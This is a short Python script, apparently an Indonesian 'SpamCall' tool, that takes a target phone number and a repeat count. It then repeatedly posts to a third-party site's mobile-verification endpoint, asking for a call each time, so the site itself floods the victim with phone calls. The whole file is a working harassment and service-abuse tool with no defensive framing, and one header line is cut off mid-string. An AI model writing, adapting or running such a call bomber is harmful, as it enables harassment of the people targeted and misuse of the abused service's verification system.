# module
import os,sys,time,requests
from time import sleep

#tampilan
os.system("clear")
sleep(1)
os.system("figlet SpamCall")
banner = """

========================================================
{•} Author : Mr•Galang                                                {•} Author : Mrs•Kila
{•} Team   : Hacker indonesia
========================================================"""
sleep(1)
print(banner)
nomor = input("Nomor Target: ")
jumlah = int(input("Jumlah Spam: "))

url = "https://id.jagreward.com/member/verify-mobile/"
ua = {'Host': "id.jagreward.com",'Connection': "keep-alive",'User-Age>
dat = {"method": "CALL","countryCode": "id",}

for i in range(jumlah):
    send = requests.post(url+nomor, headers=ua, data=dat)
    print(" [•] Status ~+> ",(send.json()["message"]))